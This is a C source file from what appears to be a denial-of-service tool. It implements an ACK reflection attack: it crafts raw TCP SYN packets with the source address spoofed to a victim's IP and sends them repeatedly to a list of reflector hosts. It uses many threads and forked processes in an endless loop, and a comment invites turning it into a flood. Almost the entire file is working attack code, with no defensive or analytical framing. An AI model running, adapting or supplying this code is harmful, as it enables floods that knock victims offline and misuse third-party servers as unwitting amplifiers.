#include <stdio.h>
// For memset
#include <string.h>
#include <sys/socket.h>
// For exit(0);
#include <stdlib.h>
// For errno - the error number
#include <errno.h>
// Provides declarations for tcp header
#include <netinet/tcp.h>
// Provides declarations for ip header
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/types.h>
#include <signal.h>

#include "../main.h"
#include "attack_ack_reflect_dos.h"

extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DisplayInfo(const char *fmt, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmt, ...);

extern void FreeProcessACKIPListBuff(pStrHeader p);
extern pStrHeader ProcessACKIPListFile(pStrHeader *output);
extern unsigned short CalculateSum(unsigned short *ptr, int nbytes);
extern int LocateStrNodeElement(const pStrHeader p, pStrNode *element, const size_t loc);

static int SendSYN(const pSYNStruct ss, const int debug_level)
{
    // this belong to the ack reflect attack part
    int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (socket_fd < 0)
    {
        DisplayError("Create socket failed: %s(%d)", strerror(errno), errno);
        if (errno == 1)
        {
            DisplayWarning("This program should run as root user");
        }
        else if (errno == 24)
        {
            DisplayWarning("You shoud check max file number use 'ulimit -n' in linux");
            DisplayWarning("And change the max file number use 'ulimit -n <setting number>'");
            DisplayWarning("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
        }
        return 1;
    }
    int i;
    // datagram to represent the packet
    char datagram[4096];
    //IP header
    struct iphdr *iph = (struct iphdr *)datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    //strcpy(source_ip, "192.168.1.1");
    sin.sin_family = AF_INET;
    sin.sin_port = htons((int)ss->dst_port);
    //sin.sin_port = htons(80);
    // target
    sin.sin_addr.s_addr = inet_addr(ss->dst_ip);
    //sin.sin_addr.s_addr = inet_addr("1.2.3.4");

    // Zero out the buffer
    //memset(datagram, 0, 4096);
    if (!memset(datagram, 0, 4096))
    {
        DisplayError("Attack memset failed");
        return 1;
    }

    // fill in the IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    // id of this packet
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    // set to 0 before calculating checksum
    iph->check = 0;
    // spoof the source ip address
    iph->saddr = inet_addr(ss->src_ip);
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = CalculateSum((unsigned short *)datagram, iph->tot_len >> 1);

    // TCP Header
    tcph->source = htons((int)ss->src_port);
    //tcph->source = htons(3306);
    //tcph->source = htons(1234);
    tcph->dest = htons((int)ss->dst_port);
    //tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    // First and only tcp segment
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    // maximum allowed window size
    tcph->window = htons(5840);
    // if you set a checksum to zero, your kernel's IP stack
    // should fill in the correct checksum during transmission
    tcph->check = 0;

    tcph->urg_ptr = 0;
    // Now the IP checksum

    psh.source_address = inet_addr(ss->src_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    if (!memcpy(&psh.tcp, tcph, sizeof(struct tcphdr)))
    {
        DisplayError("Attack memcpy failed");
        return 1;
    }

    tcph->check = CalculateSum((unsigned short *)&psh, sizeof(struct pseudo_header));

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        DisplayError("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
        //exit(0);
        return 1;
    }

    int flag = 1;
    int len = sizeof(int);
    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
    {
        DisplayError("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);
        //exit(0);
        return 1;
    }

    // Uncommend the loop if you want to flood :)
    //while (1)
    //{
    //Send the packet
    for (i = 0; i < ss->loop; i++)
    {
        //int l;
        if (sendto(
                socket_fd,               // our socket
                datagram,                // the buffer containing headers and data
                iph->tot_len,            // total length of our datagram
                0,                       // routing flags, normally always 0
                (struct sockaddr *)&sin, // socket addr, just like in
                sizeof(sin)) < 0)        // a normal send()
        {
            DisplayError("Attack send failed");
            //break;
        }
        // Data send successfull
        /*
        else
        {
            debug(debug_level, 2, "Attack packet end successful");
        }
        */
    }

    return 0;
}

static void FreeSYNStructBuff(pSYNStruct input)
{
    // free the structure
    if (input)
    {
        if (input->dst_ip)
        {
            free(input->dst_ip);
        }
        free(input);
    }
}

static int AttackThread(pSYNStruct syn_struct)
{
    // now we start the syn flood attack

    int i;

    DisplayDebug(DEBUG_LEVEL_3, syn_struct->debug_level, "ATTACK!");

    DisplayDebug(DEBUG_LEVEL_3, syn_struct->debug_level, "AttackThread start sending data...");

    // rport is random source port
    for (i = 0; i < syn_struct->each_ip_repeat; i++)
    {
        if (SendSYN(syn_struct, syn_struct->debug_level))
        {
            DisplayError("AttackThread Attack failed");
            return 1;
        }
    }
    FreeSYNStructBuff(syn_struct);
    return 0;
}

int StartACKReflectAttack(const pInput input)
{
    // run function in thread
    // this attack type must run as root

    pid_t pid, wpid;
    pthread_t tid[input->max_thread];
    pthread_attr_t attr;
    int i, j, ret;
    int status = 0;

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
    extern void FreeSplitURLBuff(pSplitURLOutput p);
    extern int SplitURL(const char *url, pSplitURLOutput *output);
    extern void SignalExit(int signo);

    signal(SIGINT, SignalExit);
    pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
    pSplitURLOutput split_result;

    syn_struct->debug_level = input->debug_level;
    syn_struct->each_ip_repeat = input->each_ip_repeat;

    if (!ProcessACKIPListFile(&(input->str_header)))
    {
        DisplayError("ProcessACKIPListFile failed");
        return 1;
    }

    syn_struct->loop = input->each_ip_repeat;
    pStrNode node;

    /* split the target address as the traffic source ip address */
    // make the source ip as the target ip address
    if (!SplitURL(input->address, &split_result))
    {
        DisplayError("AttackThread SplitURL failed");
        return 1;
    }
    if (split_result->port == 0)
    {
        if (strlen(split_result->host) == 0)
        {
            DisplayError("AttackThread SplitURL not right");
            return 1;
        }
        // make the port as default
        split_result->port = ACK_REFLECT_PORT_DEFAULT;
    }
    syn_struct->src_ip = (char *)malloc(IP_BUFFER_SIZE);
    if (!(syn_struct->src_ip))
    {
        DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!memset(syn_struct->src_ip, 0, IP_BUFFER_SIZE))
    {
        DisplayError("AttackThread memset failed: %d(%s)", strerror(errno), errno);
        return 1;
    }
    if (!strncpy(syn_struct->src_ip, input->address, strlen(input->address)))
    {
        DisplayError("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    syn_struct->src_port = (int)split_result->port;

    // unlimit loop
    node = input->str_header->next;
    for (;;)
    {
        // only one process
        if (input->max_process <= 1)
        {
            // start again
            for (j = 0; j < input->max_thread; j++)
            {
                /* 
                 * every thread has onlyone target address
                 * thread end try next address
                 */
                if (!SplitURL(node->str, &split_result))
                {
                    DisplayError("AttackThread SplitURL failed");
                    return 1;
                }

                // node cicle
                if (node->next)
                {
                    node = node->next;
                }
                else
                {
                    node = input->str_header->next;
                }

                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);

                if (split_result->port == 0)
                {
                    if (strlen(split_result->host) == 0)
                    {
                        DisplayError("AttackThread SplitURL not right");
                        return 1;
                    }
                    // make the port as default
                    split_result->port = ACK_REFLECT_PORT_DEFAULT;
                }
                // init the target ip and port
                syn_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
                if (!(syn_struct->dst_ip))
                {
                    DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
                    return 1;
                }
                if (!memset(syn_struct->dst_ip, 0, IP_BUFFER_SIZE))
                {
                    DisplayError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
                    return 1;
                }
                if (!strncpy(syn_struct->dst_ip, split_result->host, strlen(split_result->host)))
                {
                    DisplayError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
                    return 1;
                }
                syn_struct->dst_port = split_result->port;
                FreeSplitURLBuff(split_result);

                /*
                 * end the address
                 */

                //input->serial_num = (i * input->max_thread) + j;
                if (pthread_attr_init(&attr))
                {
                    DisplayError("StartSYNFlood pthread_attr_init failed");
                    return 1;
                }
                //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
                if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
                {
                    DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
                    return 1;
                }
                // create thread
                ret = pthread_create(&tid[j], &attr, (void *)AttackThread, syn_struct);
                //printf("j is: %d\n", j);
                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
                // here we make a map
                if (ret != 0)
                {
                    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
                    DisplayError("Create pthread failed");
                    return 1;
                }
                pthread_attr_destroy(&attr);
            }
            //pthread_detach(tid);
            // join them all
            for (j = 0; j < input->max_thread; j++)
            {
                pthread_join(tid[j], NULL);
            }
        }
        else
        {
            // muti process
            for (i = 0; i < input->max_process; i++)
            {
                pid = fork();
                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "pid: %d", pid);
                if (pid == 0)
                {
                    // child process
                    for (j = 0; j < input->max_thread; j++)
                    {
                        if (!SplitURL(node->str, &split_result))
                        {
                            DisplayError("AttackThread SplitURL failed");
                            return 1;
                        }

                        // node cicle
                        if (node->next)
                        {
                            node = node->next;
                        }
                        else
                        {
                            node = input->str_header->next;
                        }

                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);

                        if (split_result->port == 0)
                        {
                            if (strlen(split_result->host) == 0)
                            {
                                DisplayError("AttackThread SplitURL not right");
                                return 1;
                            }
                            // make the port as default
                            split_result->port = ACK_REFLECT_PORT_DEFAULT;
                        }
                        // init the target ip and port
                        syn_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
                        if (!(syn_struct->dst_ip))
                        {
                            DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
                            return 1;
                        }
                        if (!memset(syn_struct->dst_ip, 0, IP_BUFFER_SIZE))
                        {
                            DisplayError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
                            return 1;
                        }
                        if (!strncpy(syn_struct->dst_ip, split_result->host, strlen(split_result->host)))
                        {
                            DisplayError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
                            return 1;
                        }
                        syn_struct->dst_port = split_result->port;
                        FreeSplitURLBuff(split_result);

                        /*
                         * end the address
                         */

                        //input->serial_num = (i * input->max_thread) + j;
                        if (pthread_attr_init(&attr))
                        {
                            DisplayError("StartSYNFlood pthread_attr_init failed");
                            return 1;
                        }
                        //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
                        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
                        {
                            DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
                            return 1;
                        }
                        // create thread
                        ret = pthread_create(&tid[j], &attr, (void *)AttackThread, syn_struct);
                        //printf("j is: %d\n", j);
                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
                        // here we make a map
                        if (ret != 0)
                        {
                            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
                            DisplayError("Create pthread failed");
                            return 1;
                        }
                        pthread_attr_destroy(&attr);
                    }
                    //pthread_detach(tid);
                    // join them all
                    for (j = 0; j < input->max_thread; j++)
                    {
                        pthread_join(tid[j], NULL);
                    }
                }
                else if (pid < 0)
                {
                    DisplayError("Create process failed");
                }
                // Father process
                while ((wpid = wait(&status)) > 0)
                {
                    // nothing here
                    // wait the child process end
                }
            }
        }
    }
    FreeProcessACKIPListBuff(input->str_header);
    return 0;
}

static int AttackThreadTest(pInput input)
{
    // now we start the attack
    extern void FreeSplitURLBuff(pSplitURLOutput p);
    extern int SplitURL(const char *url, pSplitURLOutput *output);

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "AttackThreadTest start sending data...");
    if (!ProcessACKIPListFile(&(input->str_header)))
    {
        DisplayError("ProcessACKIPListFile failed");
        return 1;
    }
    pStrNode node = input->str_header->next;
    DisplayWarning(">>> start <<<");

    while (node)
    {
        DisplayInfo("id: %d - address: %s", input->seed, node->str);
        node = node->next;
    }
    DisplayWarning(">>> end <<<");
    return 0;
}

int StartACKReflectTest(const pInput input)
{
    // run function in thread
    // this attack type must run as root
    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartACKRelectTest");

    /*
    pthread_t tid[input->max_thread];
    pthread_attr_t attr;
    int ret;
    int j;

    for (j = 0; j < input->max_thread; j++)
    {
        //input->serial_num = (i * input->max_thread) + j;
        if (pthread_attr_init(&attr))
        {
            DisplayError("StartSYNFlood pthread_attr_init failed");
            return 1;
        }
        //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
        {
            DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
            return 1;
        }
        // use the input->seed to identified the thread
        input->seed = j;
        // create thread
        ret = pthread_create(&tid[j], &attr, (void *)AttackThreadTest, input);
        //printf("j is: %d\n", j);
        // here we make a map
        if (ret != 0)
        {
            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
            DisplayError("Create pthread failed");
            return 1;
        }
        pthread_attr_destroy(&attr);
    }
    //pthread_detach(tid);
    // join them all
    for (j = 0; j < input->max_thread; j++)
    {
        pthread_join(tid[j], NULL);
    }
    */
    if (1 == 2)
    {
        // not exec
        AttackThreadTest(input);
    }
    if (!ProcessACKIPListFile(&(input->str_header)))
    {
        DisplayError("ProcessACKIPListFile failed");
        return 1;
    }
    pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
    syn_struct->debug_level = input->debug_level;
    AttackThread(syn_struct);

    return 0;
}